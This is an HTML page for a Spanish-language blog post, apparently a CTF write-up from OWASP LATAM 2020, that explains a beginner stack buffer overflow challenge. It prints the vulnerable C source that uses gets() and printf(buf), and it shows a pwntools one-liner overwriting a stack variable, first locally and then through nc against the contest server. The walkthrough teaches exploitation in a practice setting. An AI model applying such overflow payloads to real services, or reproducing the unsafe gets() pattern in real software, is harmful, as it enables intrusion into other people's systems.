@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xxmeshxx">
+
+
+
+
+
+<title>OWASP 2020 - Writeup (Dr. Strange xD) Team - The Avengers | xxmeshxx</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xxmeshxx</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xxmeshxx</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/category">Categorias</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+    <meta http-equiv=”Content-Type” content=”text/html; charset=UTF-8″ />
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">OWASP 2020 - Writeup (Dr. Strange xD) Team - The Avengers</h1>
+            
+                <div class="post-meta">
+                    <!--
+                        Author: <a itemprop="author" rel="author" href="/">xxmeshxx</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">mayo 8, 2020&nbsp;&nbsp;22:13:35</a>
+                        </span>
+                    -->
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="OWASP-2020-En-Construccion"><a href="#OWASP-2020-En-Construccion" class="headerlink" title="OWASP 2020 {En Construcción}"></a>OWASP 2020 {En Construcción}</h1><p>Evento en el que participó el equipo “The Avengers” felicidades a los pwners se rifarón, yo solo pude hacer algunos retos aquí los writeups de los ejercicios que logré hacer…..</p>
+<h2 id="Over-Flow"><a href="#Over-Flow" class="headerlink" title="Over Flow"></a>Over Flow</h2><p>Este fue un ejercicio sencillo, al momento de realizarlo valia 490 puntos.</p>
+<p>El reto consta de 2 archivos, el binario y el código del mismo en formato .c.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	setvbuf(stdout, NULL, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> cookie;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">80</span>] = <span class="string">"Hola, bienvenido al OWASP LATAM Tour!!!\n\n"</span>;</span><br><span class="line">	printf(buf);</span><br><span class="line">	printf(<span class="string">"buf esta en %08x y cookie en %08x\n y la flag es....\n"</span>, &amp;buf, &amp;cookie);</span><br><span class="line">    printf(<span class="string">"give me your input!!! "</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (cookie == <span class="number">0x41424344</span>)</span><br><span class="line">	&#123;</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     printf(<span class="string">"\nLa flag es: "</span>);</span><br><span class="line">     fflush(stdout);</span><br><span class="line">     system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Como podemos darnos cuenta el reto si es de BufferOverflow ya que <code>gets</code> es una función que no revisa el tamaño del buffer(incluso cuando este se asigne previamente) y sobreescribe en pila mas datos de los que puede contener.</p>
+<p>Una de las partes importantes del reto es la siguiente:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (cookie == <span class="number">0x41424344</span>)</span><br><span class="line">	&#123;</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     printf(<span class="string">"\nLa flag es: "</span>);</span><br><span class="line">     fflush(stdout);</span><br><span class="line">     system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>Debemos sobreescribir <code>cookie</code> a <code>x0x41424344</code> para que la consola ejecute un cat a flag ;D.<br>Primero le damos permiso al binario.</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/owasp# chmod +x reto</span><br></pre></td></tr></table></figure>
+
+<p>Despues revisamos que es lo que hace:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/owasp# ./reto </span><br><span class="line">Hola, bienvenido al OWASP LATAM Tour!!!</span><br><span class="line"></span><br><span class="line">buf esta en ffdf8fec y cookie en ffdf903c</span><br><span class="line"> y la flag es....</span><br><span class="line">give me your input!!! abenyer</span><br></pre></td></tr></table></figure>
+<p>Le damos una cadena para ver que regresa en este caso fue “abenyer”, sin embargo el programa no regresa nada, le mandaremos 100 A’s para ver si causamos buffer overflow.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/owasp# python -c <span class="string">"print('A'*100)"</span> | ./reto </span><br><span class="line">Hola, bienvenido al OWASP LATAM Tour!!!</span><br><span class="line"></span><br><span class="line">buf esta en ffa2886c y cookie en ffa288bc</span><br><span class="line"> y la flag es....</span><br><span class="line">give me your input!!! Segmentation fault</span><br></pre></td></tr></table></figure>
+<p><code>Segmentation fault</code> efectivamente es buffer overflow pero ahora no es necesario aprovecharnos de <code>EIP</code> ya que solo requerimos cambiar el valor de <code>cookie</code>, pero vemos algo interesante <code>buf esta en ffa2886c y cookie en ffa288bc</code>…… </p>
+<p>Si buscamos en internet una calculadora hexadecimal y restamos el valor de <code>cookie</code>con <code>buf</code> (En este orden por que recuerden que la pila crece en direcciones bajas.)<br><img src="../owasp2020/calculator.png" alt=""></p>
+<p>Es de 80 decimal, es decir el tamaño de <code>buf</code>, esto nos da una pista y teniendo el archivo en C podemos ver un esquema general de la siguiente manera:</p>
+<p><img src="../owasp2020/bofowasp.png" alt=""></p>
+<p>Lo unico que necesitamos es rellenar <code>buf</code> hasta 80 y como <code>gets</code>sobrescribe, (lo que queramos) como ya no habra espacio los siguientes 4 bytes iran dentro de <code>cookie</code> esos 4 bytes simplemente los cambiaremos por <code>0x41424344</code> para que al seguir el flujo entre dentro de la condición, esto se logra de la siguiente manera:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/owasp# python -c <span class="string">"from pwn import *; print('A'*80+p32(0x41424344))"</span> | ./reto </span><br><span class="line">Hola, bienvenido al OWASP LATAM Tour!!!</span><br><span class="line"></span><br><span class="line">buf esta en ffeeedac y cookie en ffeeedfc</span><br><span class="line"> y la flag es....</span><br><span class="line">give me your input!!! </span><br><span class="line">La flag es: /bin/cat: flag: No such file or directory</span><br></pre></td></tr></table></figure>
+<p>“p32() -&gt; es una función de <code>pwntools</code> que lo único que hace es enviar los datos en formato Little Endian.”</p>
+<p>Excelente el programa realiza un cat a flag, obviamente no se puede ver la flag por que estamos dentro de mi equipo sin embargo cambiamos ./reto por el servidor: nc over-easy.ctf.owasplatam.org 10005</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/owasp# python -c <span class="string">"from pwn import *; print('A'*80+p32(0x41424344))"</span> | nc over-easy.ctf.owasplatam.org <span class="number">10005</span></span><br><span class="line">Hola, bienvenido al OWASP LATAM Tour!!!</span><br><span class="line"></span><br><span class="line">buf esta en ffd8049c y cookie en ffd804ec</span><br><span class="line"> y la flag es....</span><br><span class="line">give me your input!!! </span><br><span class="line">La flag es: owasp&#123;tu_primer_buffer_overflow?&#125;</span><br></pre></td></tr></table></figure>
+
+<p>FLAG: owasp{tu_primer_buffer_overflow?}</p>
+<p>Continuara ………..</p>
+<h2 id="Into-Over"><a href="#Into-Over" class="headerlink" title="Into Over"></a>Into Over</h2><h2 id="Less-One"><a href="#Less-One" class="headerlink" title="Less One"></a>Less One</h2>
+        </div>
+<!--
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xxmeshxx</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="httpd://xxmeshx.github.io/2020/05/08/owasp2020/">httpd://xxmeshx.github.io/2020/05/08/owasp2020/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                 -->
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/03/14/postman/">HTB-Postman</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© xxmeshxx | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
